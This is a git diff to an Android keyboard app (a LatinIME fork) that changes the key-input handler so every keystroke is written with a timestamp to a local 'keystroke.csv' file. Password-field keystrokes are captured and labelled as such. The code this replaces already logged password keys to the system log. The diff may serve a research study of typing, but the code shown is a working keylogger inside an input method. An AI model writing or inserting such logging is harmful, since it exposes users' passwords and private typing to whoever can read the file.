@@ -20,6 +20,12 @@ import static com.yyl.inputmethod.latin.Constants.ImeOption.FORCE_ASCII;
 import static com.yyl.inputmethod.latin.Constants.ImeOption.NO_MICROPHONE;
 import static com.yyl.inputmethod.latin.Constants.ImeOption.NO_MICROPHONE_COMPAT;
 
+import java.io.FileDescriptor;
+import java.io.PrintWriter;
+import java.util.ArrayList;
+import java.util.Locale;
+import java.util.TreeSet;
+
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.BroadcastReceiver;
@@ -74,7 +80,6 @@ import com.yyl.inputmethod.keyboard.KeyboardActionListener;
 import com.yyl.inputmethod.keyboard.KeyboardId;
 import com.yyl.inputmethod.keyboard.KeyboardSwitcher;
 import com.yyl.inputmethod.keyboard.MainKeyboardView;
-import com.yyl.inputmethod.latin.R;
 import com.yyl.inputmethod.latin.RichInputConnection.Range;
 import com.yyl.inputmethod.latin.SuggestedWords.SuggestedWordInfo;
 import com.yyl.inputmethod.latin.Utils.Stats;
@@ -82,11 +87,7 @@ import com.yyl.inputmethod.latin.define.ProductionFlag;
 import com.yyl.inputmethod.latin.suggestions.SuggestionStripView;
 import com.yyl.inputmethod.research.ResearchLogger;
 
-import java.io.FileDescriptor;
-import java.io.PrintWriter;
-import java.util.ArrayList;
-import java.util.Locale;
-import java.util.TreeSet;
+import com.yyl.inputmethod.latin.InputTypeUtils;
 
 /**
  * Input method implementation for Qwerty'ish keyboard.
@@ -1386,15 +1387,21 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     // Implementation of {@link KeyboardActionListener}.
     @Override
     public void onCodeInput(final int primaryCode, final int x, final int y) {
+    	final Logger logger = new Logger("keystroke.csv");
     	// yulong
     	final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
+    	boolean isMoreKeysPanel = mainKeyboardView.isShowingMoreKeysPanel();
     	int variation = getCurrentInputEditorInfo().inputType & InputType.TYPE_MASK_VARIATION;
     	if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD
     	     || variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
-    	     || variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD) {
-    	          Log.i("onCodeInput", primaryCode + " " + " password " + mainKeyboardView.isShowingMoreKeysPanel());
+    	     || variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD){
+//    	          Log.i("onCodeInput", logger.mappingKey(primaryCode) + " " + " password " + isMoreKeysPanel);
+    	          logger.appendWithTime(primaryCode, "password," + isMoreKeysPanel);
+//    			logger.append(primaryCode + " " + (char)primaryCode);
     	} else {
-    	          Log.i("onCodeInput", primaryCode + " " + " application " + mainKeyboardView.isShowingMoreKeysPanel());
+//    	          Log.i("onCodeInput", logger.mappingKey(primaryCode) + " " + " application " + isMoreKeysPanel);
+    	          logger.appendWithTime(primaryCode, "application," + isMoreKeysPanel);
+//    			logger.append(primaryCode + " " + (char)primaryCode);
     	}
     	
         if (ProductionFlag.USES_DEVELOPMENT_ONLY_DIAGNOSTICS) {
